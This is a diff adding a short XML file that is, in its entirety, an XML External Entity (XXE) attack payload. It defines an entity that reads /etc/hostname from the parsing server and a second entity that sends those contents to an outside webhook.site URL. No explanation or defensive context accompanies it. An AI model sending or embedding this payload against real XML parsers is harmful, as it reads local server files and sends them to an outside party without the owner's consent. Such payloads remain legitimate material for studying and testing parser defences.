@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY file1 SYSTEM "file:///etc/hostname">
+<!ENTITY send1 SYSTEM "https://webhook.site/b0f0ee90-5e79-45bf-a161-4c8898938e41?tag=internal_dtd&leak1=&file1;">
+]>
+<r>&file1;&send1;</r>
